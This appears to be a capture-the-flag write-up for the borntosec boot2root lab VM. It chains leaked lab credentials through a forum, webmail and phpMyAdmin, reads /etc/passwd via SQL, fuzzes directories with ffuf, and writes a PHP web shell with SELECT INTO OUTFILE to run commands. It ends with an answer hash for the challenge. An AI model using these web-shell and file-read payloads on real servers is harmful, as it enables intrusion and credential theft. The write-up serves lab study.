

# REPORT

On the port `80` we have a apache2 server serving a single page application. 

On the port `443` we have a apache2 server serving 3 services: 
- `/forum/`, wich is a fourm powered by `mylittleforum`
- `/webmail/` wich is a web mail application powered by `squirrelMail` 
- `/phpmyadmin/` which is `phpmyadmin` pluged to the `mylittleforum` database  


### FORUM

In the `forum` we found an interesting post where credentials are included: `lmezard:!q\]Ej?*5K5cy*AJ` </br>
These credentials allows us to connect to the `forum` as `lmezard`. In the profile settings we get the mail address of the account: `laurie@borntosec.net` </br>

### WEB MAIL

With this address and the password found we can acceed to the account of `laurie` in the web server mail `laurie@borntosec.net:!q\]Ej?*5K5cy*AJ` </br>
A mail from `qudevide` gives us the credentials of `phpmyadmin`: `root:Fg-'kKXBj87E:aJ$` </br>

### PHPMYADMIN

Once connected to the `phpmyadmin` pannel we have access to the database `forum_db` corresponding to the database of the `forum`. 
We get users's informations like:
- Users's mail addresses
- Users's hashed passwords 

...
We can connect to the `admin` account by editing the hashe with the same hash as `lmezard` which is a known password. 
...


In the `phpmyadmin` pannel we can make `SQL queries` as the `mysql` user. 
Allowing us to read and write on the machine like reading the file `/etc/passwd` giving the users on the machine:
```
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
```
- The apache2's configuration file gives us the location of the directories served by the server: `SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default')`
```
<VirtualHost *:443>
ServerAdmin webmaster@localhost
...
Alias /phpmyadmin /usr/share/phpmyadmin
...
Alias /forum /var/www/forum
...
Alias /webmail /usr/share/squirrelmail
...
```

### WEB SHELL (/forum)

Because the `mysql` user writing's permission are limited. We `fuzz` on the `/forum` directory to find directories where we can write a `web shell` in `php`:
```
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://192.168.56.112/forum/FUZZ -fs 288
...
templates_c             [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 4ms]
:: Progress: [220559/220559] :: Job [1/1] :: 10000 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```

We can create files on the directory `/forum/templates_c/` with the SQL Query: 
```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/script.php'
...
https://192.168.56.112/forum/templates_c/script.php?cmd=whoami
```

In the `/home` directory we found the folder `LOOKATME` containing the file `password`:
```
https://192.168.56.112/forum/templates_c/script.php?cmd=cat%20/home/LOOKATME/password
...
lmezard:G!@M6f4Eatau{sF" 
```

### FTP

The credentials are for the ftp account of `lmezard`. After accessing connecting to it we found 2 files:
```
ftp> dir
229 Entering Extended Passive Mode (|||26935|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun

$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

$ file fun          
fun: POSIX tar archive (GNU)
```


`sha256('Iheartpwnage') = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` 